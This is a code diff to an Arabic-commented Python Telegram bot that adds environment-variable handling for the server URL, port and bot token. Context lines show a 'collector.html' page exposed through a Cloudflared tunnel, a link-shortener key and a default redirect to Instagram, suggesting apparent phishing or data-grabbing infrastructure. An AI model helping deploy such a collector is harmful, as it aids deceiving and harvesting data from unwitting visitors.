@@ -71,6 +71,22 @@ CUTTLY_API_KEY = _get_env('CUTTLY_API_KEY', '')
 # الرابط الافتراضي للتحويل (لو محددتش)
 DEFAULT_REDIRECT = "https://www.instagram.com/"
 
+
+def apply_runtime_config():
+    env_url = normalize_server_url(_get_env('SERVER_URL', '') or _get_env('PUBLIC_URL', ''))
+    if env_url and config.get('server_url_source') != 'manual':
+        config['server_url'] = env_url
+        config['server_url_source'] = 'env'
+
+    port_value = _get_env('PORT', '')
+    if port_value:
+        try:
+            config['port'] = int(port_value)
+        except ValueError:
+            pass
+
+    save_json(CONFIG_FILE, config)
+
 # ============================================
 # 📁 ملفات التخزين
 # ============================================
@@ -124,6 +140,8 @@ config.setdefault('cloudflared_running', False)
 config.setdefault('cloudflared_tunnel', '')
 config.setdefault('port', 5000)
 
+apply_runtime_config()
+
 subscribers_data = load_json(SUBSCRIBERS_FILE, ADMIN_IDS)
 if not isinstance(subscribers_data, list):
     subscribers_data = ADMIN_IDS
@@ -140,6 +158,9 @@ BROADCAST_PHOTO_MODE = 'photo'
 # ============================================
 # 🤖 تهيئة البوت
 # ============================================
+if not BOT_TOKEN:
+    raise RuntimeError("BOT_TOKEN غير موجود. أضفه في ملف .env أو في متغيرات البيئة.")
+
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # ============================================
@@ -179,10 +200,19 @@ def get_server_url():
     if live_url:
         return live_url
 
+    if config.get('server_url_source') == 'env':
+        env_url = normalize_server_url(config.get('server_url', ''))
+        if env_url:
+            return env_url
+
     if config.get('server_url_source') == 'manual':
         manual_url = normalize_server_url(config.get('server_url', ''))
         if manual_url:
             return manual_url
+
+    env_url = normalize_server_url(_get_env('SERVER_URL', '') or _get_env('PUBLIC_URL', ''))
+    if env_url:
+        return env_url
     return ''
 
 
@@ -371,6 +401,15 @@ def run_cloudflared():
 
 def run_tunnel():
     """يحاول استخدام رابط سيرفر موجود أو تشغيل Cloudflared"""
+    env_url = normalize_server_url(_get_env('SERVER_URL', '') or _get_env('PUBLIC_URL', ''))
+    if env_url:
+        global active_server_url
+        active_server_url = env_url
+        config['server_url'] = env_url
+        config['server_url_source'] = 'env'
+        print(f"✅ تم استخدام رابط البيئة: {env_url}")
+        return True
+
     if run_cloudflared():
         return True
 
@@ -1122,25 +1161,27 @@ def run_all():
     print("=" * 50)
     print("🚀 تشغيل النظام المتكامل...")
     print("=" * 50)
-    
+
+    port = config.get('port', 5000)
+
     # 1. التحقق من وجود ملف collector.html
     if not os.path.exists('collector.html'):
         print("❌ ملف collector.html غير موجود!")
         print("📥 تأكد من وجود الملف في نفس المجلد")
         return
-    
+
     # 2. تشغيل السيرفر في خيط منفصل
     print("🔄 تشغيل السيرفر...")
     threading.Thread(target=lambda: app.run(
-        host='0.0.0.0', 
-        port=config.get('port', 5000), 
-        debug=False, 
+        host='0.0.0.0',
+        port=port,
+        debug=False,
         use_reloader=False
     ), daemon=True).start()
-    
+
     # 3. انتظار السيرفر
     time.sleep(2)
-    print("✅ السيرفر المحلي شغال على http://localhost:5000")
+    print(f"✅ السيرفر المحلي شغال على http://localhost:{port}")
     
     # 4. تشغيل خدمة النفق (Cloudflared) أو استخدام الرابط الموجود
     print("🌩️ يجرب استخدام رابط السيرفر الخارجي أو Cloudflared...")
